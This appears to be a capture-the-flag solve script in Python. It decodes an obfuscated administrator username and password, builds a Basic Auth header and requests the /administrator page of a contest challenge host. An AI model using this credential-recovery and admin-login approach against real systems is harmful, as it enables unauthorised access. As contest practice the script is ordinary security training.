#!/usr/bin/env python3
import urllib.request
import base64

# Decode username from hex array
username_hex = [0x61,0x64,0x6d,0x69,0x6e,0x31,0x73,0x74,0x72,0x61,0x74,0x30,0x72]
username = ''.join(chr(x) for x in username_hex)

# Decode password from hex string
password_hex = '393920373320313036203637203837203834203639203839203533203333203130332035352036352038392039342037362038302031323120333720313134'
# First convert hex to ASCII
temp = ''.join(chr(int(password_hex[i:i+2], 16)) for i in range(0, len(password_hex), 2))
# Then the result should be space-separated decimal values, convert those to chars
password = ''.join(chr(int(x)) for x in temp.split())

print(f"Username: {username}")
print(f"Password: {password}")

# Create Basic Auth header
auth_string = f"{username}:{password}"
auth_bytes = auth_string.encode('latin-1')
auth_b64 = base64.b64encode(auth_bytes).decode('ascii')

print(f"\nBasic Auth: {auth_b64}")

# Try GET request to /administrator
url = "http://chals.uscc-cyberbowl-2025.ctf.institute:3004/administrator"

request = urllib.request.Request(url)
request.add_header('Authorization', f'Basic {auth_b64}')

print(f"\nMaking request to {url}...")

try:
    with urllib.request.urlopen(request) as response:
        print(f"Status Code: {response.status}")
        print(f"Response Headers: {dict(response.headers)}")
        body = response.read().decode('utf-8')
        print(f"\nResponse Body:\n{body}")
except urllib.error.HTTPError as e:
    print(f"HTTP Error: {e.code}")
    print(f"Response: {e.read().decode('utf-8')}")
